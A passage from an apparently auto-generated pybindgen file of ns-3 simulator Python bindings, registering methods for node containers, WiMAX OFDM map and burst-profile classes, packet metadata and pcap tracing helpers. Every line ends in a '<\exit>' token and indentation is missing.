cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd')])<\exit>
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd'), param('ns3::NodeContainer const &', 'e')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::NodeContainer', 'other')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('std::string', 'nodeName')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Create',<\exit>
'void',<\exit>
[param('uint32_t', 'n')])<\exit>
cls.add_method('Create',<\exit>
'void',<\exit>
[param('uint32_t', 'n'), param('uint32_t', 'systemId')])<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ptr< ns3::Node >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetGlobal',<\exit>
'ns3::NodeContainer',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ObjectBase_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectBase const &', 'arg0')])<\exit>
cls.add_method('GetAttribute',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue &', 'value')],<\exit>
is_const=True)<\exit>
cls.add_method('GetAttributeFailSafe',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue &', 'attribute')],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('SetAttribute',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])<\exit>
cls.add_method('SetAttributeFailSafe',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])<\exit>
cls.add_method('TraceConnect',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('TraceConnectWithoutContext',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('TraceDisconnect',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('TraceDisconnectWithoutContext',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])<\exit>
cls.add_method('ConstructSelf',<\exit>
'void',<\exit>
[param('ns3::AttributeConstructionList const &', 'attributes')],<\exit>
visibility='protected')<\exit>
cls.add_method('NotifyConstructionCompleted',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ObjectDeleter_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectDeleter const &', 'arg0')])<\exit>
cls.add_method('Delete',<\exit>
'void',<\exit>
[param('ns3::Object *', 'object')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3ObjectFactory_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([param('ns3::ObjectFactory const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('std::string', 'typeId')])<\exit>
cls.add_method('Create',<\exit>
'ns3::Ptr< ns3::Object >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])<\exit>
cls.add_method('SetTypeId',<\exit>
'void',<\exit>
[param('ns3::TypeId', 'tid')])<\exit>
cls.add_method('SetTypeId',<\exit>
'void',<\exit>
[param('char const *', 'tid')])<\exit>
cls.add_method('SetTypeId',<\exit>
'void',<\exit>
[param('std::string', 'tid')])<\exit>
return<\exit>
def register_Ns3OfdmDcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBaseStationId',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetChannelNr',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameNumber',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRtg',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTtg',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBaseStationId',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'baseStationId')])<\exit>
cls.add_method('SetChannelNr',<\exit>
'void',<\exit>
[param('uint8_t', 'channelNr')])<\exit>
cls.add_method('SetFrameDurationCode',<\exit>
'void',<\exit>
[param('uint8_t', 'frameDurationCode')])<\exit>
cls.add_method('SetFrameNumber',<\exit>
'void',<\exit>
[param('uint32_t', 'frameNumber')])<\exit>
cls.add_method('SetRtg',<\exit>
'void',<\exit>
[param('uint8_t', 'rtg')])<\exit>
cls.add_method('SetTtg',<\exit>
'void',<\exit>
[param('uint8_t', 'ttg')])<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3OfdmDlBurstProfile_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDlBurstProfile const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFecCodeType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetDiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'diuc')])<\exit>
cls.add_method('SetFecCodeType',<\exit>
'void',<\exit>
[param('uint8_t', 'fecCodeType')])<\exit>
cls.add_method('SetLength',<\exit>
'void',<\exit>
[param('uint8_t', 'length')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmDlMapIe_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDlMapIe const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPreamblePresent',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStartTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetDiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'diuc')])<\exit>
cls.add_method('SetPreamblePresent',<\exit>
'void',<\exit>
[param('uint8_t', 'preamblePresent')])<\exit>
cls.add_method('SetStartTime',<\exit>
'void',<\exit>
[param('uint16_t', 'startTime')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmUlBurstProfile_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmUlBurstProfile const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetFecCodeType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetFecCodeType',<\exit>
'void',<\exit>
[param('uint8_t', 'fecCodeType')])<\exit>
cls.add_method('SetLength',<\exit>
'void',<\exit>
[param('uint8_t', 'length')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('SetUiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'uiuc')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmUlMapIe_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmUlMapIe const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDuration',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMidambleRepetitionInterval',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetStartTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSubchannelIndex',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUiuc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetDuration',<\exit>
'void',<\exit>
[param('uint16_t', 'duration')])<\exit>
cls.add_method('SetMidambleRepetitionInterval',<\exit>
'void',<\exit>
[param('uint8_t', 'midambleRepetitionInterval')])<\exit>
cls.add_method('SetStartTime',<\exit>
'void',<\exit>
[param('uint16_t', 'startTime')])<\exit>
cls.add_method('SetSubchannelIndex',<\exit>
'void',<\exit>
[param('uint8_t', 'subchannelIndex')])<\exit>
cls.add_method('SetUiuc',<\exit>
'void',<\exit>
[param('uint8_t', 'uiuc')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3PacketMetadata_methods(root_module, cls):<\exit>
cls.add_constructor([param('uint64_t', 'uid'), param('uint32_t', 'size')])<\exit>
cls.add_constructor([param('ns3::PacketMetadata const &', 'o')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('ns3::PacketMetadata const &', 'o')])<\exit>
cls.add_method('AddHeader',<\exit>
'void',<\exit>
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])<\exit>
cls.add_method('AddPaddingAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('AddTrailer',<\exit>
'void',<\exit>
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])<\exit>
cls.add_method('BeginItem',<\exit>
'ns3::PacketMetadata::ItemIterator',<\exit>
[param('ns3::Buffer', 'buffer')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFragment',<\exit>
'ns3::PacketMetadata',<\exit>
[param('uint32_t', 'start'), param('uint32_t', 'end')],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('Enable',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('EnableChecking',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('RemoveAtStart',<\exit>
'void',<\exit>
[param('uint32_t', 'start')])<\exit>
cls.add_method('RemoveHeader',<\exit>
'void',<\exit>
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])<\exit>
cls.add_method('RemoveTrailer',<\exit>
'void',<\exit>
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3PacketMetadataItem_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PacketMetadata::Item const &', 'arg0')])<\exit>
cls.add_instance_attribute('current', 'ns3::Buffer::Iterator', is_const=False)<\exit>
cls.add_instance_attribute('currentSize', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('currentTrimedFromEnd', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('currentTrimedFromStart', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('isFragment', 'bool', is_const=False)<\exit>
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)<\exit>
return<\exit>
def register_Ns3PacketMetadataItemIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketMetadata::ItemIterator const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::PacketMetadata const *', 'metadata'), param('ns3::Buffer', 'buffer')])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::PacketMetadata::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PacketTagIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketTagIterator const &', 'arg0')])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::PacketTagIterator::Item',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PacketTagIteratorItem_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketTagIterator::Item const &', 'arg0')])<\exit>
cls.add_method('GetTag',<\exit>
'void',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3PacketTagList_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PacketTagList const &', 'o')])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Tag const &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('Head',<\exit>
'ns3::PacketTagList::TagData const *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('Remove',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')])<\exit>
cls.add_method('RemoveAll',<\exit>
'void',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PacketTagListTagData_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PacketTagList::TagData const &', 'arg0')])<\exit>
cls.add_instance_attribute('count', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('data', 'uint8_t [ 20 ]', is_const=False)<\exit>
cls.add_instance_attribute('next', 'ns3::PacketTagList::TagData *', is_const=False)<\exit>
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)<\exit>
return<\exit>
def register_Ns3PcapFile_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Clear',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Close',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Diff',<\exit>
'bool',<\exit>
[param('std::string const &', 'f1'), param('std::string const &', 'f2'), param('uint32_t &', 'sec'), param('uint32_t &', 'usec'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT')],<\exit>
is_static=True)<\exit>
cls.add_method('Eof',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Fail',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDataLinkType',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetMagic',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSigFigs',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSnapLen',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSwapMode',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('GetTimeZoneOffset',<\exit>
'int32_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMajor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMinor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('Init',<\exit>
'void',<\exit>
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT'), param('int32_t', 'timeZoneCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT'), param('bool', 'swapMode', default_value='false')])<\exit>
cls.add_method('Open',<\exit>
'void',<\exit>
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])<\exit>
cls.add_method('Read',<\exit>
'void',<\exit>
[param('uint8_t * const', 'data'), param('uint32_t', 'maxBytes'), param('uint32_t &', 'tsSec'), param('uint32_t &', 'tsUsec'), param('uint32_t &', 'inclLen'), param('uint32_t &', 'origLen'), param('uint32_t &', 'readLen')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('uint8_t const * const', 'data'), param('uint32_t', 'totalLen')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_static_attribute('SNAPLEN_DEFAULT', 'uint32_t const', is_const=True)<\exit>
cls.add_static_attribute('ZONE_DEFAULT', 'int32_t const', is_const=True)<\exit>
return<\exit>
def register_Ns3PcapHelper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PcapHelper const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateFile',<\exit>
'ns3::Ptr< ns3::PcapFileWrapper >',<\exit>
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode'), param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='65535'), param('int32_t', 'tzCorrection', default_value='0')])<\exit>
cls.add_method('GetFilenameFromDevice',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])<\exit>
cls.add_method('GetFilenameFromInterfacePair',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])<\exit>
return<\exit>
def register_Ns3PcapHelperForDevice_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PcapHelperForDevice const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcapAll',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcapInternal',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous'), param('bool', 'explicitFilename')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3RandomVariable_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::RandomVariable const &', 'o')])<\exit>
cls.add_method('GetInteger',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3SNRToBlockErrorRateManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SNRToBlockErrorRateManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('ActivateLoss',<\exit>
'void',<\exit>
[param('bool', 'loss')])<\exit>
cls.add_method('GetBlockErrorRate',<\exit>
'double',<\exit>
[param('double', 'SNR'), param('uint8_t', 'modulation')])<\exit>
cls.add_method('GetSNRToBlockErrorRateRecord',<\exit>
'ns3::SNRToBlockErrorRateRecord *',<\exit>
[param('double', 'SNR'), param('uint8_t', 'modulation')])<\exit>
cls.add_method('GetTraceFilePath',<\exit>
'std::string',<\exit>
[])<\exit>
cls.add_method('LoadDefaultTraces',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('LoadTraces',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ReLoadTraces',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetTraceFilePath',<\exit>
'void',<\exit>
[param('char *', 'traceFilePath')])<\exit>
return<\exit>
def register_Ns3SNRToBlockErrorRateRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SNRToBlockErrorRateRecord const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'snrValue'), param('double', 'bitErrorRate'), param('double', 'BlockErrorRate'), param('double', 'sigma2'), param('double', 'I1'), param('double', 'I2')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::SNRToBlockErrorRateRecord *',<\exit>
[])<\exit>
cls.add_method('GetBitErrorRate',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetBlockErrorRate',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetI1',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetI2',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetSNRValue',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetSigma2',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('SetBitErrorRate',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetBlockErrorRate',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetI1',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetI2',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetSNRValue',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
return<\exit>
def register_Ns3SSRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SSRecord const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_constructor([param('ns3::Mac48Address', 'macAddress'), param('ns3::Ipv4Address', 'IPaddress')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('DisablePollForRanging',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('EnablePollForRanging',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetAreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBasicCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDsaRsp',<\exit>
'ns3::DsaRsp',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDsaRspRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowBe',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowNrtps',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowRtps',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowUgs',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIPAddress',<\exit>
'ns3::Ipv4Address',<\exit>
[])<\exit>
cls.add_method('GetInvitedRangRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIsBroadcastSS',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetModulationType',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPollForRanging',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPollMeBit',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPrimaryCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingCorrectionRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingStatus',<\exit>
'ns3::WimaxNetDevice::RangingStatus',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlows',<\exit>
'std::vector< ns3::ServiceFlow * >',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IncrementDsaRspRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('IncrementInvitedRangingRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('IncrementRangingCorrectionRetries',<\exit>
'void',<\exit>
[])<\exit>
